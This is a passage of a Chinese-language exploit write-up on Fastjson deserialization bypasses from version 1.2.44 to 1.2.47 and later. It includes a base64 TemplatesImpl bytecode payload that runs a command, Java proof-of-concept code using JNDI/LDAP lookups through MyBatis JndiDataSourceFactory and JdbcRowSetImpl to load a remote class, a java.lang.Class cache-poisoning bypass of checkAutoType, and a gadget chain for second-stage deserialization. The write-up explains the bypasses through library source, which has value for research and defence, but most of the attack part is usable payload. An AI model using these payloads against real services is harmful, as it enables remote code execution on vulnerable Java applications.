\"_bytecodes\":[\"yv66vgAAADQAOwoACQAqCgArACwIAC0KACsALgcALwcAMAoABgAxBwAyBwAzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2V4YW1wbGUvZmFzdGpzb25fdG9zdHJpbmcvZXZpbGNsYXNzOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBABBNZXRob2RQYXJhbWV0ZXJzAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADQBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAC8BAApTb3VyY2VGaWxlAQAOZXZpbGNsYXNzLmphdmEMAAoACwcANQwANgA3AQAEY2FsYwwAOAA5AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADoBACdjb20vZXhhbXBsZS9mYXN0anNvbl90b3N0cmluZy9ldmlsY2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAACQARABIAAgAMAAAAKwAAAAEAAAABsQAAAAIADQAAAAYAAQAAABYADgAAAAwAAQAAAAEAEwAUAAAAFQAAAAUBABMAAAABABYAFwADAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAGwAOAAAAIAADAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABABoAGwACABwAAAAEAAEAHQAVAAAACQIAGAAAABoAAAABABYAHgADAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAIAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABAB8AIAACAAAAAQAhACIAAwAcAAAABAABAB0AFQAAAA0DABgAAAAfAAAAIQAAAAgAIwALAAEADAAAAGYAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQADAA0AAAAWAAUAAAAOAAkAEQAMAA8ADQAQABYAEgAOAAAADAABAA0ACQAkACUAAAAmAAAABwACTAcAJwkAAQAoAAAAAgAp\"], '_name':'c.c', '_tfactory':{ },\"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);
        //因为bytescodes等属性私有，需要加Feature.SupportNonPublicField
    }
}


```
在前面加入[，后面加入[{
弹计算器，1.2.44 修改了,对[进行了限制。
## 1.2.45
使用接口
```c
 <dependency>
            <groupId>org.mybatis</groupId>
            <artifactId>mybatis</artifactId>
            <version>3.5.6</version>
        </dependency>
```
```c
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
public class fj_1245 {
    public static void main(String[] args) throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\n" +
                "    \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
                "    \"properties\":{\n" +
                "        \"data_source\":\"ldap://127.0.0.1:9999/evilref\"\n" +
                "    }\n" +
                "}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);

    }
}

```
记得开启恶意类监听端口然后开启ldap服务。
# 1.2.47
绕过checkautovalue，将恶意类加载到mapping中，
```c
public Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {
    ...
if (this.autoTypeSupport || expectClass != null) {
                    hash = h3;

                    for(i = 3; i < className.length(); ++i) {
                        hash ^= (long)className.charAt(i);
                        hash *= 1099511628211L;
                        if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                            clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                            if (clazz != null) {
                                return clazz;
                            }
                        }

                        if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }
                    }
                }

                if (clazz == null) {
                    clazz = TypeUtils.getClassFromMapping(typeName);
                }

                if (clazz == null) {
                    clazz = this.deserializers.findClass(typeName);
                }

                if (clazz != null) {
                    if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    } else {
                        return clazz;
                    }
                } else {
                    if (!this.autoTypeSupport) {
                        hash = h3;

                        for(i = 3; i < className.length(); ++i) {
                            char c = className.charAt(i);
                            hash ^= (long)c;
                            hash *= 1099511628211L;
                            if (Arrays.binarySearch(this.denyHashCodes, hash) >= 0) {
                                throw new JSONException("autoType is not support. " + typeName);
                            }

                            if (Arrays.binarySearch(this.acceptHashCodes, hash) >= 0) {
                                if (clazz == null) {
                                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                                }

                                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                                }

                                return clazz;
                            }
                        }
                    }

                    if (clazz == null) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                    }

                    if (clazz != null) {
                        if (TypeUtils.getAnnotation(clazz, JSONType.class) != null) {
                            return clazz;
                        }

                        if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }

                        if (expectClass != null) {
                            if (expectClass.isAssignableFrom(clazz)) {
                                return clazz;
                            }

                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                        }

                        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, this.propertyNamingStrategy);
                        if (beanInfo.creatorConstructor != null && this.autoTypeSupport) {
                            throw new JSONException("autoType is not support. " + typeName);
                        }
                    }

                    int mask = Feature.SupportAutoType.mask;
                    boolean autoTypeSupport = this.autoTypeSupport || (features & mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;
                    if (!autoTypeSupport) {
                        throw new JSONException("autoType is not support. " + typeName);
                    } else {
                        return clazz;
                    }
                }
            }
        } else {
            throw new JSONException("autoType is not support. " + typeName);
        }
    }

                 
    







    
}
```
重点在：
```c
if (clazz == null) {
                    clazz = TypeUtils.getClassFromMapping(typeName);
                }
```
跟进去
```c
 public static Class<?> getClassFromMapping(String className) {
        return (Class)mappings.get(className);
    }

```
于是寻找mappings被赋值的地方：
```c
TypeUtils#addBaseClassMappings
TypeUtils#loadClass
```
第一个无参方法，不可控，看第二个
```c
 public static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {
 
        ...
        //对类名进行检查和判断
        try{
            //第一处，classLoader不为null
            if(classLoader != null){
                clazz = classLoader.loadClass(className);
 
                //如果chche为true，则将我们输入的className缓存入mapping中
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            e.printStackTrace();
            // skip
        }
        try{
            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
 
            //第二处，检查较为严格
            if(contextClassLoader != null && contextClassLoader != classLoader){
                clazz = contextClassLoader.loadClass(className);
 
                //如果chche为true，则将我们输入的className缓存入mapping中
                if (cache) {
                    mappings.put(className, clazz);
                }
                return clazz;
            }
        } catch(Throwable e){
            // skip
        }
 
        //第三处，
        try{
            clazz = Class.forName(className);
            mappings.put(className, clazz);
            return clazz;
        } catch(Throwable e){
            // skip
        }
        return clazz;
    }
```
三处调用put，将class写入mapping。
在Miscdoec.deserialze：
```c
if (clazz == Class.class) {
                            return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
```
要求clazz为CLass原型，问题不大，type那里改一下，
然后要控制一下strval的值，
```c
if (objVal == null) {
                strVal = null;
            } else {
                if (!(objVal instanceof String)) {
                    if (objVal instanceof JSONObject) 
strVal = (String)objVal;
```
```c
Object objVal;
            if (parser.resolveStatus == 2) {
                parser.resolveStatus = 0;
                parser.accept(16);
                if (lexer.token() != 4) {
                    throw new JSONException("syntax error");
                }

                if (!"val".equals(lexer.stringVal())) {
                    throw new JSONException("syntax error");
                }

                lexer.nextToken();
                parser.accept(17);
                objVal = parser.parse();
                parser.accept(13);
            } else {
                objVal = parser.parse();
            }
```
会解析val值，据此，可以构造出一部分payload：
```c
{

    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
}
```
这部分内容会被加载的mapping里面，
```c
{
     "1":{
           "@type":"java.lang.Class",
           "val":"com.sun.rowset.JdbcRowSetImpl"
         }
          
     "2":{    
           "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"ldap://127.0.0.1:9999/EXP",
           "autoCommit":"true"
         }
}
```
最后再利用这个恶意类。
会反序列化两个对象，反序列化第一个时候，会从deserializer的deserialize调用miscodec调用deserialize，从而把恶意类加载到mapping，第二次反序列化时直接反序列化成功。在获取deserializer时会自动获取miscodec，可能这是内部设定的吧，class类key对应这个miscodec的，正好反序列化又有恶意方法，太巧了。。

之后的版本修复了这个问题，并且ban了java.lang.class。

# 二次反序列化
声明：看看就好，本地不一定能复现出来。
配合一个signedobject可以整一个二次反序列化。
[https://xz.aliyun.com/t/12606](https://xz.aliyun.com/t/12606)
[https://tttang.com/archive/1701/#toc_rmiconnector](https://tttang.com/archive/1701/#toc_rmiconnector)

事故可能来源于aliyunctf(不会Java，被狂虐的黑暗时光)的ezbean，通过fastjson的tostring去调用getter，实现rce。
gadget
```java
BadAttributeValueExpException#readObject
JSONArray#toString
TemplatesImpl#getOutputProperties
```
fastjson不是通过readobject去反序列化对象，而是调用了getter和setter去反序列化对象。
1.2.49以后，resolveClassban了很多危险的类。
这时候就要通过signedobject去反序列化了，绕过了waf。


